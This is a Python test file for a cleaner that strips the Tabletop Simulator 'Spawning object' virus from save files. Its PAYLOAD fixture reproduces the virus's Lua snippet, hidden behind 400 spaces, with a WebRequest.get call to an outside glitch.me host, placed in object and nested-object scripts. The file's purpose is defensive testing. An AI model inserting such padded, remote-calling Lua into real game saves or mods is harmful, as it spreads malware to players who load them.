"""Tests for stripping the TTS "Spawning object" virus."""

from __future__ import annotations

import json
from pathlib import Path

from dnd_tools import clean_tts_virus

PAYLOAD = (
    " " * 400
    + '--[[Object base code]]Wait.time(function() x("tcejbo gninwapS") end)'
    + 'WebRequest.get("https://obje.glitch.me/")--[[Spawning object]]\n\n'
)


def _save(script: str) -> dict[str, object]:
    return {
        "LuaScript": script,
        "ObjectStates": [
            {"GUID": "aaa", "LuaScript": "function onLoad() end" + PAYLOAD, "posX": 1.25},
            {"GUID": "bbb", "ContainedObjects": [{"GUID": "ccc", "LuaScript": PAYLOAD}]},
        ],
    }


def test_strips_payload_everywhere_and_keeps_the_rest(tmp_path: Path) -> None:
    path = tmp_path / "save.json"
    path.write_text(json.dumps(_save("print(1)" + PAYLOAD), indent=2))
    assert clean_tts_virus.main([str(path), "--write"]) == 0
    text = path.read_text()
    assert "gninwapS" not in text
    data = json.loads(text)
    assert data["LuaScript"] == "print(1)"
    assert data["ObjectStates"][0]["LuaScript"] == "function onLoad() end"
    assert data["ObjectStates"][0]["posX"] == 1.25
    assert data["ObjectStates"][1]["ContainedObjects"][0]["LuaScript"] == ""


def test_dry_run_leaves_file(tmp_path: Path) -> None:
    path = tmp_path / "save.json"
    original = json.dumps(_save("print(1)" + PAYLOAD))
    path.write_text(original)
    assert clean_tts_virus.main([str(path)]) == 0
    assert path.read_text() == original


def test_unknown_variant_fails_and_is_not_written(tmp_path: Path) -> None:
    path = tmp_path / "save.json"
    original = json.dumps(_save('x = "tcejbo gninwapS"'))
    path.write_text(original)
    assert clean_tts_virus.main([str(path), "--write"]) == 1
    assert path.read_text() == original


def test_clean_file_passes_untouched(tmp_path: Path) -> None:
    path = tmp_path / "save.json"
    original = json.dumps({"LuaScript": "print(1)", "ObjectStates": []})
    path.write_text(original)
    assert clean_tts_virus.main([str(path), "--write"]) == 0
    assert path.read_text() == original
